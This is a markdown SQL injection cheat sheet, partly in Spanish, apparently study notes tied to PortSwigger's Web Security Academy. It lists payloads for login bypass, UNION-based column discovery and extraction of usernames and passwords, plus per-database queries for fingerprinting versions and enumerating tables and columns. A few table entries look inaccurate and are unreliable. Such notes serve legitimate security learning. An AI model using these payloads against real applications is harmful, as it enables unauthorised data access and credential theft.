# SQL INJECTION
## Retrieving hidden data
```
'OR 1=1--
'OR+1=1--
```
## Subverting application logic
```
SELECT * FROM users WHERE username = 'administrator'--'
-- Comment line
```
## Retrieving data from other database tables (UNION)

### Get number of columns

**Metodo 1**
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
**Metodo 2**
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
### Database-specific syntax
```
ORACLE
UNION SELECT 'Other Value', 2 FROM DUAL--

DB2
UNION SELECT 'Other Value', 2 FROM SYSIBM.SYSDUMMY1--

Para las demás:
UNION SELECT NULL, NULL--
```
### Finding columns with a useful data type
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Retrieving data from other tables
```
Requisitos
-Conocer el nombre de la tabla
-Conocer el nombre de las columnas
Ejemplo:
'UNION SELECT username, password FROM users--
```

### Retrieve interesting data // Examining the database 
**Database type and version**

| Database            | Query                     |
| ------------------- | ------------------------- |
| Microsoft SQL Server| `SELECT @@version`        |
| MySQL               | `SELECT @@version`        |
| Oracle              | `SELECT * FROM v$version` |
| PostgreSQL          | `SELECT version()`        |
| SQLite              | `SELECT sqlite_version()` |
| MariaDB             | `SELECT @@version`        |
| IBM Db2             | `SELECT service_level, fixpack_num FROM TABLE (sysproc.env_get_inst_info())` |
| Amazon Aurora       | `SELECT version()`        |
| SAP HANA            | `SELECT VERSION FROM SYS.M_DATABASE` |
| Amazon RDS          | `SELECT version()`        |
| Google Cloud SQL    | `SELECT version()`        |
| Teradata            | `SELECT INFO FROM dbc.dbcinfo` |
| Informix            | `SELECT DBINFO('version','full') FROM systables WHERE tabid = 1` |
| InterBase           | `SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database` |
| Firebird            | `SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database` |
| Snowflake           | `SELECT CURRENT_VERSION()` |
| Vertica             | `SELECT version()`        |
| Netezza             | `SELECT VERSION()`        |
| Clustrix            | `SELECT CLUSTRIX_VERSION()` |

**Listing the contents of the database**
| Database            | Query                                  |
| ------------------- | -------------------------------------- |
| Microsoft SQL Server| `SELECT * FROM information_schema.tables` |
| MySQL               | `SELECT * FROM information_schema.tables` |
| Oracle              | `SELECT * FROM all_tables`             |
| PostgreSQL          | `SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--` |
| SQLite              | `SELECT name FROM sqlite_master WHERE type='table'` |
| MariaDB             | `SELECT * FROM information_schema.tables` |
| IBM Db2             | `SELECT * FROM syscat.tables`          |
| Amazon Aurora       | `SELECT * FROM information_schema.tables` |
| SAP HANA            | `SELECT * FROM tables`                 |
| Amazon RDS          | `SELECT * FROM information_schema.tables` |
| Google Cloud SQL    | `SELECT * FROM information_schema.tables` |
| Teradata            | `SELECT * FROM dbc.tables`             |
| Informix            | `SELECT * FROM systables`              |
| InterBase           | `SELECT * FROM RDB$RELATIONS WHERE RDB$RELATION_TYPE = 0` |
| Firebird            | `SELECT * FROM RDB$RELATIONS WHERE RDB$RELATION_TYPE = 0` |
| Snowflake           | `SHOW TABLES`                          |
| Vertica             | `SELECT * FROM v_catalog.tables`       |
| Netezza             | `SELECT * FROM _v_table`               |
| Clustrix            | `SELECT * FROM information_schema.tables` |

**Lista solo las tablas creadas por el susuario**
| Database            | Query                                                                                   |
| ------------------- | --------------------------------------------------------------------------------------- |
| Microsoft SQL Server| `SELECT table_name FROM information_schema.tables WHERE table_schema = 'dbo' AND table_type = 'BASE TABLE';` |
| MySQL               | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| Oracle              | `SELECT table_name FROM user_tables;`                                                   |
| PostgreSQL          | `SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE';` |
| SQLite              | `SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%';`        |
| MariaDB             | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| IBM Db2             | `SELECT table_name FROM syscat.tables WHERE tabschema = 'YOUR_SCHEMA' AND type = 'T';`  |
| Amazon Aurora       | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| SAP HANA            | `SELECT table_name FROM tables WHERE schema_name = 'YOUR_SCHEMA';`                      |
| Amazon RDS          | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| Google Cloud SQL    | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| Microsoft Access    | `SELECT Name FROM MSysObjects WHERE Type=1 AND Flags=0;`                                 |
| Teradata            | `SELECT table_name FROM dbc.tables WHERE tablekind = 'T' AND databasename = 'your_database_name';` |
| Informix            | `SELECT tabname FROM systables WHERE tabtype = 'T';`                                     |
| InterBase           | `SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG = 0;`                |
| Firebird            | `SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG = 0;`                |
| Snowflake           | `SHOW TABLES IN SCHEMA YOUR_SCHEMA;`                                                    |
| Vertica             | `SELECT table_name FROM v_catalog.tables WHERE is_system_table = false;`                |
| Netezza             | `SELECT table_name FROM _v_table WHERE objtype = 'TABLE';`                              |
| Clustrix            | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |

**Lista las columnas de la tabla**

| Database            | Query                                                                                              |
| ------------------- | -------------------------------------------------------------------------------------------------- |
| Microsoft SQL Server| `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| MySQL               | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| Oracle              | `SELECT column_name, data_type FROM user_tab_columns WHERE table_name = 'TABLE';`                   |
| PostgreSQL          | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| SQLite              | `PRAGMA table_info('table');`                                                                      |
| MariaDB             | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| IBM Db2             | `SELECT colname, typename FROM syscat.columns WHERE tabname = 'TABLE';`                            |
| Amazon Aurora       | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| SAP HANA            | `SELECT column_name, data_type FROM public.tables WHERE table_name = 'TABLE';`                      |
| Amazon RDS          | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| Google Cloud SQL    | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| Microsoft Access    | `SELECT Name, Type FROM MSysObjects WHERE Type=1 AND Flags=0;`                                      |
| Teradata            | `SELECT columnname, columntype FROM dbc.columns WHERE tablename = 'TABLE';`                        |
| Informix            | `SELECT colname, coltype FROM syscolumns WHERE tabname = 'table';`                                 |
| InterBase           | `SELECT RDB$FIELD_NAME, RDB$FIELD_TYPE FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME = 'TABLE';` |
| Firebird            | `SELECT RDB$FIELD_NAME, RDB$FIELD_TYPE FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME = 'TABLE';` |
| Snowflake           | `SHOW COLUMNS IN TABLE table;`                                                                     |
| Vertica             | `SELECT column_name, data_type FROM v_catalog.columns WHERE table_name = 'table';`                  |
| Netezza             | `SELECT columnname, datatype FROM _v_relation_column WHERE tablename = 'TABLE';`                    |
| Clustrix            | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |




## Cheat Sheet
https://portswigger.net/web-security/sql-injection/cheat-sheet
